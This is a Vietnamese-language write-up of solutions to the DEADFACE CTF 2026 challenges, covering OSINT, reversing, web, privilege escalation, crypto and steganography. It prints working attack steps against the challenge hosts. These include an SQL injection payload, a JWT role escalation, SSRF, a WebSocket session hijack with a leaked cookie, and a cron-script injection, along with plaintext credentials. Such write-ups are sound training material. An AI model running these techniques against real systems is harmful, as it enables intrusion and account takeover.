# DEADFACE CTF 2026 — Master Writeup

> Tổng hợp toàn bộ lời giải, chia theo dạng đề. Flag format: `deadface{...}`
> Nền tảng: `ctf.deadface.io`. Thế giới giả lập gồm diễn đàn **GhostTown** (`ghosttown.deadface.io`) và mạng xã hội **DoomScroll** (`doomscroll.dctf.io`).

## Mục lục

1. [OSINT](#1-osint)
2. [Reverse Engineering (RE)](#2-reverse-engineering-re)
3. [Pwn / Binary Exploitation](#3-pwn--binary-exploitation)
4. [Web Exploitation](#4-web-exploitation)
5. [SQL / Database Forensics](#5-sql--database-forensics)
6. [Mobile (iOS App Analysis)](#6-mobile-ios-app-analysis)
7. [Linux Privilege Escalation](#7-linux-privilege-escalation)
8. [Crypto](#8-crypto)
9. [Steganography](#9-steganography)
10. [Network Recon](#10-network-recon)
11. [Bảng tổng kết flag](#11-bảng-tổng-kết-flag)
12. [Tổng kết kỹ thuật theo dạng đề](#12-tổng-kết-kỹ-thuật-theo-dạng-đề)

Ghi chú nguồn: Phần OSINT, Crypto, Steg tổng hợp từ các bài giải trong phiên làm việc (File Dump 01/02, The Mark, Death, chesskey, Keep Digging, Speak Friend). Phần RE, Pwn, Web, SQL, Mobile, Privesc, Network lấy từ `DEADFACE_CTF_Writeup.md`.

---

## 1. OSINT

### 1.1. File Dump 01

**Flag:** `deadface{gh0st404}`

Xác định kẻ mạo danh Daniel Hameser (nhà thiết kế đồ họa) là tài khoản **gh0st404**. Metadata tài liệu có tác giả `ghostwriter404` / máy `GHOST404-PC`, trùng handle. Trên DoomScroll gh0st404 hiển thị tên "Jimmy", Tallahassee, FL.

### 1.2. The Mark

**Flag:** `deadface{Santos_Staudenmaier}`

- Thread GhostTown `/t/59` tiết lộ DoomScroll có API trả dữ liệu không hiện trên feed.
- Quét `GET /api/posts/<id>/meta`, giữ post có `meta` khác rỗng. Các post 223, 224, 226, 227, 228 có key `pt1`…`pt5` (post 225 không thuộc chuỗi).
- Giá trị trông rỗng thực chất là chuỗi khoảng trắng Unicode mã hóa cơ số 3:

  | Ký tự | Mã | Trị số |
  |---|---|---|
  | En Space | `U+2002` | 0 |
  | Em Space | `U+2003` | 1 |
  | Thin Space | `U+2009` | 2 |

- Cứ 6 ký tự = một số cơ số 3 = một ký tự ASCII. Văn bản giải ra nêu **Santos Staudenmaier, CFO của TGRI**.

```python
mp = {' ': 0, ' ': 1, ' ': 2}
d = [mp[c] for c in value]
text = ''.join(chr(int(''.join(map(str, d[i:i+6])), 3)) for i in range(0, len(d), 6))
```

### 1.3. File Dump 02 — nơi máy tính bị lấy

**Điểm:** 75 — **Flag:** `deadface{alaska_macstore}`

| Manh mối | Nội dung |
|---|---|
| `reciept_1.png` | Dịch vụ máy tính 250 USD, 08/14/2026, thẻ ****4242, địa chỉ "17 A..." |
| `snip.png` | Cửa hàng có số 17, logo Apple, chữ "Apple Specialist" |
| `advertising_ad_1.png` | Golden Donuts, 2213 E Tudor Rd, Anchorage, AK |
| `businesscard_1.png` | Alpine Mechanical, (907) 344-9011 — mã vùng Alaska |

Ghép lại: **Alaska MacStore**, 2217 E Tudor Rd, Ste. 17, Anchorage, AK — cạnh Golden Donuts. Suite 17 khớp hóa đơn và ảnh.

**Bài học:** file trông như nhiễu (quảng cáo donut, danh thiếp) lại là manh mối địa điểm; ảnh cửa hàng do AI tạo nên Street View/Lens không ra.

### 1.4. Death — tên thật của `d34th`

**Điểm:** 230 (@syyntax) — **Flag:** `deadface{Travis}`

1. Tìm `d34th` trên GhostTown → thread `/t/48` "d34th pls explain the glasses": d34th đeo kính tròng vàng, luciafer xin đăng ảnh lên DoomScroll.
2. `d34th` không có tài khoản DoomScroll, nhưng luciafer có **post 200** ("see life in 4K nacho cheese") — ảnh người đeo kính tròng vàng.
3. `GET /api/posts/200/meta`:
   - key `filename` = **`travis_001.png`** ← tên
   - key thứ hai: chuỗi khoảng trắng giải cơ số 3 ra "Check it out, we can use DoomScroll for covert comms".

**Bài học:** tên nhân vật nằm ở metadata ảnh, không ở profile. Luôn kiểm tra `/meta` của post liên quan.


## 2. Reverse Engineering (RE)

### 2.1. Lizard Binary (Spooky Cereals)

**File:** `re04-win-x64.exe` (PE 64-bit) — **Flag:** `deadface{Liz4rds_L0ve_Krampuffs_for_some_odd_reason...}`

1. **Password:** chương trình MD5-hash input rồi so với `0d107d09f5bbe40cade3de5c71e9e9b7` = hash của `letmein`.
2. **Anti-debug trap (gotcha):** VEH tại `0x140001000`; thread phụ dùng `SetThreadContext` đặt **hardware breakpoint** (Dr0/Dr7) lên hàm success `0x140001ad0`. Khi password đúng chạm hàm đó, single-step exception kích hoạt, handler mới ghi **key `0xd1cefa11badc0de5`** vào global `0x140024ab0`.
3. **Giải mã:** success lấy 8 byte đầu `MD5(password)` (LE), XOR với key, dùng làm seed **xorshift64** (13,7,17), XOR-decrypt 55 byte tại `0x1400185a0`.

```python
import pefile, hashlib
d = pefile.PE('re04-win-x64.exe').get_memory_mapped_image()
ct = d[0x185a0:0x185a0+55]
h = hashlib.md5(b'letmein').digest()
key = 0xd1cefa11badc0de5
s = int.from_bytes(h[:8], 'little') ^ key
M = (1 << 64) - 1
out = bytearray()
for c in ct:
    s ^= (s << 13) & M; s ^= s >> 7; s ^= (s << 17) & M
    out.append(c ^ (s & 0xff))
print(bytes(out))
```

**Bài học:** patch qua redirect "Access granted" mà không để handler chạy → key = 0 → ra rác. Phải để bẫy chạy đúng quy trình.

---

## 3. Pwn / Binary Exploitation

### 3.1. Cursed Library

**Files:** `Cursed_Library`, `libc.so.6` (glibc 2.42), `ld-linux-x86-64.so.2`, `run`.

Menu: Peruse (`ls`), Check out a book (đọc file), Leave. Bộ lọc đọc file (phát hiện qua thông báo lỗi khác nhau):

| Input | Thông báo | Điều kiện |
|---|---|---|
| `../flag`, `/home/*/flag` | "That tome is forbidden!!!" | chứa `..` hoặc `*` |
| `./flag`, `/flag` | "The librarian doesn't understand" | chứa `/` |
| `flag`, `flag.txt` | "You could have sworn..." | tên hợp lệ nhưng không tồn tại |

→ chặn `..`, `*`, `/` → chỉ đọc file trong cwd. Offset libc 2.42 (ret2libc):

```
system: 0x54790   execve: 0xe1090   "/bin/sh": 0x1aaea4
puts: 0x82060     __libc_start_main: 0x29fa0
BuildID: c9a199fd28ea54b305ea35a8b25500a79bfe684a
```

"Your Library Card" ám chỉ chính **libc**: rò rỉ địa chỉ → tính base → ret2libc.

---

## 4. Web Exploitation

### 4.1. Health Spark Employer Portal — "I Want to be a Real Boy"

**Target:** `http://45.79.200.170:3000/`. Chain nhiều tầng, login chỉ là mồi.

**Tầng 1 — SQLi disclosure (honeypot):** `' OR '1'='1` vào username trả data thật dù báo "Login failed", lộ `"flag":"deadface{typical_and_classic}"` — **flag bẫy**.

```javascript
fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({username:"' OR '1'='1",password:"x"})}).then(r=>r.json()).then(console.log)
```

**Tầng 2 — Swagger lộ:** `/api-docs/swagger-ui-init.js` lộ `/file_document` (IDOR qua `departmentid`), `/api/profile` (reflect vào session claims), `/api/admin/fetch-photo` (fetch URL nội bộ).

**Tầng 3 — Mass Assignment → Admin JWT:** `/api/profile` nhét field người dùng vào JWT claims rồi tự ký lại → gửi kèm `role:"admin"` được token admin hợp lệ (không cần crack secret).

```javascript
fetch('/api/profile',{method:'POST',
  headers:{'Content-Type':'application/json',Authorization:'Bearer '+T.token},
  body:JSON.stringify({name:"John Smith",role:"admin"})}).then(r=>r.json()).then(d=>{window.A=d;});
```

**Tầng 4 — SSRF → flag thật:** `/api/admin/fetch-photo` với `http://localhost:8080/` → "Internal Admin Console":

```
admin_console_token: deadface{oh_you_shouldnt_be_here}
```

**Flag thật:** `deadface{oh_you_shouldnt_be_here}` (bài Exposure of Files: `deadface{someone_should_report_this}`).
**Chain:** SQLi disclosure → Swagger → mass assignment (JWT) → SSRF. **Bài học:** đừng tin flag đầu tiên (honeypot).

### 4.2. Spook-A-Thon (NFS + WebSocket Cookie Hijack)

**Target:** `170.187.156.131` (tránh port 8443 — bài khác).

**Recon:** `nmap -Pn -T4 --top-ports 1000` thấy `2049 nfs` + `111 rpcbind` mở ra Internet.

**NFS:**
```bash
showmount -e 170.187.156.131      # /home/retrobyte/Documents/srv/nfs *
sudo mount -t nfs -o vers=3,nolock 170.187.156.131:/home/retrobyte/Documents/srv/nfs /mnt/jerry
cat /mnt/jerry/shared/spooky_board.log
```

Log WebSocket board lộ: lấy flag qua `{"cmd":"get_flag"}` cần admin; cookie admin `s3ssion=adm1n-3f9a7c21b8d4e6f0`.

```python
import websocket, json
ws = websocket.create_connection("ws://170.187.156.131:8080/",
    header=["Cookie: s3ssion=adm1n-3f9a7c21b8d4e6f0"])
ws.send(json.dumps({"cmd":"get_flag"})); print(ws.recv())
```

**Bài học:** NFS export công khai (lỗi recon) → log lộ cookie admin → hijack session.

---

## 5. SQL / Database Forensics

**Môi trường:** MySQL/MariaDB tại `aurora.dctf.io`. DB: `aurora_audit`, `aurora_ehr`, `aurora_pharmacy`, `aurora_trials`.

### 5.1. Phantom Patient → MRN
Bệnh nhân có ≥1 đơn Schedule II nhưng 0 encounter.
```sql
SELECT p.mrn, p.patient_id
FROM aurora_ehr.patients p
JOIN aurora_pharmacy.prescriptions rx ON rx.patient_id = p.patient_id
JOIN aurora_pharmacy.drugs d ON d.drug_id = rx.drug_id
WHERE d.dea_schedule = 'II'
  AND NOT EXISTS (SELECT 1 FROM aurora_ehr.encounters e WHERE e.patient_id = p.patient_id)
GROUP BY p.mrn, p.patient_id;
```
Dùng `NOT EXISTS` thay `NOT IN` vì cột cho phép NULL.

### 5.2. Post-lock Edit → Subject Code
Veltrexa: subject có `primary_efficacy_delta` sửa sau data-lock.
```sql
SELECT sub.subject_code, r.modified_at, s.data_lock_date
FROM aurora_trials.results r
JOIN aurora_trials.subjects sub ON sub.subject_id = r.subject_id
JOIN aurora_trials.studies s ON s.study_id = sub.study_id
WHERE s.drug_name LIKE '%Veltrexa%' AND r.measure = 'primary_efficacy_delta'
  AND r.modified_at > s.data_lock_date;
```

### 5.3. Impossible Travel → Username
Login 2 workstation cùng timestamp.
```sql
SELECT u.username, COUNT(*) AS dup_events
FROM (SELECT user_id, accessed_at FROM aurora_audit.access_log
      GROUP BY user_id, accessed_at HAVING COUNT(DISTINCT workstation) > 1) t
JOIN aurora_audit.users u ON u.user_id = t.user_id
GROUP BY u.username ORDER BY dup_events DESC;
```

### 5.4. Statistical Outlier (3σ) → Subject Code
```sql
SELECT sub.subject_code, r.value
FROM aurora_trials.results r
JOIN aurora_trials.subjects sub ON sub.subject_id = r.subject_id
JOIN aurora_trials.studies s ON s.study_id = sub.study_id
WHERE s.drug_name LIKE '%Veltrexa%' AND r.measure = 'primary_efficacy_delta'
  AND r.value > (SELECT AVG(r2.value) + 3*STDDEV_POP(r2.value)
      FROM aurora_trials.results r2
      JOIN aurora_trials.subjects sub2 ON sub2.subject_id = r2.subject_id
      JOIN aurora_trials.studies s2 ON s2.study_id = sub2.study_id
      WHERE s2.drug_name LIKE '%Veltrexa%' AND r2.measure = 'primary_efficacy_delta')
ORDER BY r.value DESC;
```

### 5.5. Handler Codename (Intersection)
Codename có ở cả `aurora_audit.users` lẫn `aurora_ehr.providers`.
```sql
SELECT DISTINCT u.handler_ref
FROM aurora_audit.users u
JOIN aurora_ehr.providers p ON p.handler_ref = u.handler_ref
WHERE u.handler_ref IS NOT NULL;
```
MySQL không có `INTERSECT` → dùng `INNER JOIN` trên `DISTINCT`.

---

## 6. Mobile (iOS App Analysis)

**File:** `AuroraPatientPortal.ipa` (= zip, phân tích tĩnh).

```bash
unzip -l AuroraPatientPortal.ipa   # binary Mach-O, aurora_meds.sqlite, Info.plist, Assets.car...
```

- **Info Leaks → Name + DOB:** `deadface{mara-voss-1988-04-17}`
- **Down the Rabbit Hole → Patient ID:** `deadface{PID-847261}`
- **SQL Skillz → Medication:** query `aurora_meds.sqlite` với pid 847261, thuốc ngoài Ibuprofen là **Candesartan** → `deadface{Candesartan}`
- **Back to Basics → Gateway Name:** `strings` trên Mach-O tìm `gw-westlake-int-03` → `deadface{gw-westlake-int-03}`

**Bài học:** secret trong `.ipa` nằm ở SQLite, plist, Assets, hoặc strings của Mach-O. Không cần emulator.

---

## 7. Linux Privilege Escalation

**Box `charon`**, bắt đầu là `svc-deploy`. Chuỗi: `svc-deploy → deephax → gh0st404 → sunstalker`.

- **Foothold:** `deadface{f00th0ld_p4st_th3_v31l}` (tại `~/flag.txt`).
- **Looking Back (shell history):** `deadface{sh3ll_h1st0ry_t3lls_4ll}`. `.bash_history` lộ `deephax:Sk4t3rB0y_S1nce_2011` → `su - deephax`.
- **Git Good (git history):** repo `kingmaker-scraper`, commit cũ lộ credential.
  ```bash
  git log --oneline --all
  git show 49df4e8:config.py   # SERVICE_USER="gh0st404" / SERVICE_PW="Gh0stInTh3Sh3ll_404"
  su - gh0st404
  ```
  **Bài học:** xóa secret ở commit mới không xóa khỏi lịch sử.
- **On Schedule (cron abuse):** `/opt/scrape/collect.sh` chạy bởi sunstalker qua cron nhưng gh0st404 ghi được.
  ```bash
  echo 'cat /home/sunstalker/flag.txt > /tmp/.sf 2>/dev/null; chmod 666 /tmp/.sf' >> /opt/scrape/collect.sh
  cat /tmp/.sf   # poll tới khi cron tick
  ```

---

## 8. Crypto

### 8.1. chesskey (Carlsen)

**Điểm:** 200 (@syyntax). Calling card: `checkmate. nZ3ipU8_yy3p5_hvyKi0`.
**Giải mã ra:** `ch3ckm8_ch3s5_crypt0` (nộp `deadface{...}`; hoa/thường cuối tùy flag đúng, bản gốc `cH3ckM8_ch3s5_cryPt0`).

Cơ chế (thread GhostTown `/t/38` "carlsen gave me an idea"):
- Ảnh là bàn cờ 8×8, mỗi ô một chữ cái (lặp được). Khóa lấy từ các nước của Magnus Carlsen trong một ván 2026 mở đầu English Opening: chữ trên bàn cờ ở ô đích mỗi nước. Vigenère 26 chữ; chữ số và `_` đi qua không tiêu thụ khóa, giữ hoa/thường.

Bàn cờ (hàng trên = hạng 8):
```
AIWYAEIO / JBKBFJPU / XLCMKQVA / ZCNDOWBE / DGLPEQFI / HMRXRFSK / NSYCGTGU / TZDHJLVH
```

Cách làm: đoán plaintext bắt đầu `ch3ckm8` → khóa đầu `LSGFI` → quét 1232 ván Chess.com + 65 ván chessgames, chỉ một ván khớp: 2026-01-13, MagnusCarlsen vs Beca95 (https://www.chess.com/game/live/162638222425). Khóa đầy đủ `lsgfiwrxfeavpxdchddbbvfzrwneuob`.

```python
rows = ["AIWYAEIO","JBKBFJPU","XLCMKQVA","ZCNDOWBE","DGLPEQFI","HMRXRFSK","NSYCGTGU","TZDHJLVH"]
key = ''.join(rows[8-int(d[1])]["abcdefgh".index(d[0])] for d in magnus_white_dest_squares).lower()
A = "abcdefghijklmnopqrstuvwxyz"; ct = "nZ3ipU8_yy3p5_hvyKi0"; k = 0; out = ''
for c in ct:
    if c.isdigit() or c == '_':
        out += c; continue
    p = (A.index(c.lower()) - A.index(key[k])) % 26; k += 1
    out += A[p].upper() if c.isupper() else A[p]
# out = cH3ckM8_ch3s5_cryPt0
```

**Bài học:** đề bảo "dùng thông tin trong GhostTown" → thread nhân vật chứa luôn quy tắc mã hóa; dùng crib để rút gọn không gian khóa.

### 8.2. Speak Friend and Enter (Web + Crypto)

**Flag:** `deadface{we-411-h4v3-the-s4me-1nt3rnet-d0-w3-n0t}`

- Trang trả `Vary: User-Agent`; bản ẩn chỉ hiện với UA `SunstalkerDFBrower/2.0 (Linux; Android 14)`.
- Ciphertext `pilotnoi{...}` là **Vigenère trên a-z0-9** với khóa `mellon` ("speak friend and enter").
- Lưu ý: ban đầu flag bị từ chối do lỗi ban tổ chức, sau đã sửa.

---

## 9. Steganography

### 9.1. Keep Digging

**Điểm:** 100 (@syyntax) — **Flag:** `deadface{D1g_d0wN_D33p!}`

1. `keep_digging.jpg` (SHA256 `12582c19…8ff8e2`) là JPEG **progressive** 448×670, không có dữ liệu sau EOI. `binwalk`/`steghide`/`zsteg` vô dụng.
2. Đọc DCT bằng `jpeglib` báo *"796 extraneous bytes before marker 0xda"*; cắt file theo scan cho thấy ~796 byte thừa ngay sau **scan DC (scan 1)**.
3. Tự giải mã scan DC bằng bảng Huffman trong file: ảnh dùng 4704 block, phần thừa giải thêm 558 block → dựng lại thấy dải chữ ở đáy → **ảnh bị cắt chiều cao**.
4. Header SOF ghi chiều cao 670 (`0x029E`). Sửa thành **752** (`0x02F0`) rồi giải mã lại; scan AC cũng có dữ liệu cho phần đó → dòng chữ hiện ra.

```python
d = bytearray(open('keep_digging.jpg', 'rb').read())
d[176:178] = (752).to_bytes(2, 'big')   # chiều cao trong SOF
open('fixed.jpg', 'wb').write(d)
```

**Bài học:** cảnh báo "extraneous bytes" của libjpeg là dấu hiệu dữ liệu giấu/cắt. Chiều cao nằm ở byte 176–177. Ảnh trông bị cắt → thử tăng height trong SOF.

### 9.2. File Dump 03 — *ghi chú*

**Điểm:** 200 (STEG, NETWORK). File ngoài là FTP `45.79.200.170:21` trong `technical_details.docx`. Bạn tự làm, chưa có ghi chép — bổ sung sau khi giải.

---

## 10. Network Recon

Kỹ thuật recon chung (dùng ở Spook-A-Thon và các bài khác):

- **Phân biệt đóng/mở/firewall-drop:** `curl -w "HTTP %{http_code}"` → `000` + timeout = firewall DROP.
- **nmap khi host chặn ICMP:** `-Pn` + `-p-` hoặc `--top-ports`.
- **Xác nhận host sống:** `nc -z -v -w5 <ip> <port>`.
- **NFS:** `showmount -e <ip>` → `mount -t nfs`.
- **TLS cert (OPSEC):** `openssl s_client -connect host:port | openssl x509 -noout -text`; tra Certificate Transparency ở `crt.sh`.

---

## 11. Bảng tổng kết flag

| # | Dạng | Challenge | Flag |
|---|---|---|---|
| 1 | OSINT | File Dump 01 | `deadface{gh0st404}` |
| 2 | OSINT | The Mark | `deadface{Santos_Staudenmaier}` |
| 3 | OSINT | File Dump 02 | `deadface{alaska_macstore}` |
| 4 | OSINT | Death | `deadface{Travis}` |
| 5 | OSINT | Get the Bag | *chưa giải* |
| 6 | RE | Lizard Binary | `deadface{Liz4rds_L0ve_Krampuffs_for_some_odd_reason...}` |
| 7 | Web | Health Spark — Exposure of Files | `deadface{someone_should_report_this}` |
| 8 | Web | Health Spark — honeypot | `deadface{typical_and_classic}` |
| 9 | Web | Health Spark — become admin | `deadface{oh_you_shouldnt_be_here}` |
| 10 | Web/Net | Spook-A-Thon (NFS + WS) | *(cookie hijack → get_flag)* |
| 11 | Mobile | Info Leaks | `deadface{mara-voss-1988-04-17}` |
| 12 | Mobile | Down the Rabbit Hole | `deadface{PID-847261}` |
| 13 | Mobile | SQL Skillz | `deadface{Candesartan}` |
| 14 | Mobile | Back to Basics | `deadface{gw-westlake-int-03}` |
| 15 | Privesc | Foothold | `deadface{f00th0ld_p4st_th3_v31l}` |
| 16 | Privesc | Looking Back | `deadface{sh3ll_h1st0ry_t3lls_4ll}` |
| 17 | Privesc | Git Good | *(pw gh0st404 từ git → flag home)* |
| 18 | Privesc | On Schedule | *(cron abuse → flag sunstalker)* |
| 19 | SQL | Phantom Patient | *(MRN từ query)* |
| 20 | SQL | Post-lock Edit | *(subject_code)* |
| 21 | SQL | Impossible Travel | *(username)* |
| 22 | SQL | 3σ Outlier | *(subject_code)* |
| 23 | SQL | Handler Codename | *(codename)* |
| 24 | Crypto | chesskey (Carlsen) | `deadface{ch3ckm8_ch3s5_crypt0}` |
| 25 | Crypto/Web | Speak Friend and Enter | `deadface{we-411-h4v3-the-s4me-1nt3rnet-d0-w3-n0t}` |
| 26 | Steg | Keep Digging | `deadface{D1g_d0wN_D33p!}` |
| 27 | Steg/Net | File Dump 03 | *chưa có ghi chép* |

> Ô *(...)* là flag phụ thuộc dữ liệu runtime từng session — điền khi nộp.

---

## 12. Tổng kết kỹ thuật theo dạng đề

| Dạng | Công cụ / kỹ thuật chính |
|---|---|
| **OSINT** | Đọc API ẩn (`/meta`) của DoomScroll; giải khoảng trắng Unicode cơ số 3; pivot forum → social; khớp ảnh/hóa đơn/địa điểm |
| **RE** | `pefile`, `capstone`; nhận diện MD5 phổ biến; anti-debug (HW breakpoint, VEH); xorshift64 |
| **Pwn** | Phân tích libc version, rút offset, ret2libc; đọc filter từ error message |
| **Web** | SQLi disclosure, lộ Swagger, JWT mass assignment, SSRF, honeypot awareness, WebSocket session hijack |
| **SQL Forensics** | JOIN đa DB, `NOT EXISTS`/anti-join, `STDDEV_POP`, intersection qua INNER JOIN |
| **Mobile** | `.ipa` = zip; SQLite, plist, `strings` Mach-O; không cần emulator |
| **Privesc** | `.bash_history`, git history mining, cron file abuse, pivot nhiều user |
| **Crypto** | Vigenère biến thể (a-z0-9, hoặc khóa từ bàn cờ); crib + quét khóa trên dữ liệu công khai; UA-based cloaking |
| **Steg** | Cấu trúc JPEG, phần dư scan DC, sửa SOF height |
| **Network** | `nmap -Pn`, phân biệt firewall drop, NFS `showmount`/mount, TLS cert / CT logs |
